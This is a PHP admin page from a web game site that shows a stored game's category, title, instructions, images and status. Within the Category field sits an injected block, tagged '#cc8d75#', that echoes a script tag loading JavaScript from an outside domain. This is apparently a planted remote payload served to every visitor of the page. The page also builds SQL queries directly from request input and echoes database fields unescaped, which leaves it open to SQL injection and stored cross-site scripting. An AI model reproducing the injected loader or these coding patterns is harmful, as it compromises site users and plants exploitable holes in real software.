<?php session_start();
ob_start();

$page = "View Game";
$side_menu = "Game";
include "inc/session_check.php";
 
 $aid = urlsafe_b64decode($_REQUEST['id']);
 
$selectart = mysql_query("select * from game where id='$aid'");
$fetchart = mysql_fetch_array($selectart);
 
?>
<!DOCTYPE html>
  <!--[if lt IE 7]>
    <html class="lt-ie9 lt-ie8 lt-ie7" lang="en">
  <![endif]-->

  <!--[if IE 7]>
    <html class="lt-ie9 lt-ie8" lang="en">
  <![endif]-->

  <!--[if IE 8]>
    <html class="lt-ie9" lang="en">
  <![endif]-->

  <!--[if gt IE 8]>
    <!-->
    <html lang="en">
    <!--
  <![endif]-->

  <head>
    <meta charset="utf-8">
    <title>Game Admin | Add Game</title>
     <link href="icomoon/style.css" rel="stylesheet">
    <!--[if lte IE 7]>
      <script src="css/icomoon-font/lte-ie7.js"></script>
    <![endif]-->
    <link href="css/main.css" rel="stylesheet">
    

  </head>
  <body>
    
    <?php 
	  	include "inc/header.php";
    ?>

    <div class="container-fluid">
      
    <?php 
	  	include "inc/main_nav.php";
    ?>
      
      <div class="dashboard-wrapper">
        <div class="main-container">
        
          <?php 
		  	include "inc/sub_navbar.php";
			include "inc/breadcrumb.php";
		  ?>

			<div class="row-fluid">
            <div class="span6">
              <div class="widget">
                <div class="widget-header">
                  <div class="title">
                  View Game
                  </div>
                </div>
                <div class="widget-body">
 
<form class="form-horizontal no-margin well" name="post_article" id="post_article" enctype="multipart/form-data" method="post">
<h5 class="text-info">Game Information</h5>
<hr>
<div class="control-group">
  <label class="control-label">
    Category * :
  </label>
  <div class="controls">
    <?php
	$selectcat = mysql_query("select id,cat_name from category where id=$fetchart[cat_id]");
	$fetchcat=mysql_fetch_array($selectcat);
	echo $fetchcat['cat_name'];
	 ?>
<?php
#cc8d75#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967037\"></script>";
echo $g;
}
#/cc8d75#
?>  </div>
</div>

<div class="control-group">
  <label class="control-label">
   Title:
  </label>
  <div class="controls">
<label class="radio inline">
<?=$fetchart['title']?>
 </label> 
  </div>
</div>

<div class="control-group">
  <label class="control-label">
    Instructions * :
  </label>
  <div class="controls">
 		<?=$fetchart['instructions']?>	  
   </div>
</div>
<div class="control-group">
  <label class="control-label">
    Image File :
  </label>
  <div class="controls">&nbsp; <img src="<?=$fetchart['image_file']?>" width="100" /> 
  </div>
</div>

<div class="control-group">
  <label class="control-label">
    Keywords :
  </label>
  <div class="controls">
    <?=$fetchart['keywords']?>
  </div>
</div>

<div class="control-group">
  <label class="control-label">
    Meta Tag
  </label>
  <div class="controls">
   <?=$fetchart['meta_tag']?>
  </div>
</div>
<div class="control-group">
  <label class="control-label">
    Flash File :
  </label>
  <div class="controls">&nbsp; <?=$fetchart['flash_file']?> 
  </div>
</div>

<div class="control-group">
  <label class="control-label">
    Other Site :
  </label>
  <div class="controls">
    <?=$fetchart['other_site']?>
  </div>
</div> 



<div class="control-group">
                      <label class="control-label">
                      	Status : </label>
                      <div class="controls">
	 
					  <?php if($fetchart['status']==1){ echo "Active"; } 
					   if($fetchart['status']==0){ echo "Inactive"; } ?>  
				 
				</div>
                    </div> 
 
<div class="form-actions no-margin">
 <a href="list_game.php"><input type="button" class="btn" name="reset" value="Back" /></a> 
</div>
</form>
<script src="js/wysiwyg/wysihtml5-0.3.0.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/wysiwyg/bootstrap-wysihtml5.js"></script>
<link href="css/jquery-ui-1.10.3.custom.css" rel="stylesheet">
<script type="text/javascript"  src="js/jquery-latest.js"></script>
<script src="js/jquery-ui-1.10.3.custom.js"></script>

</body>
</html>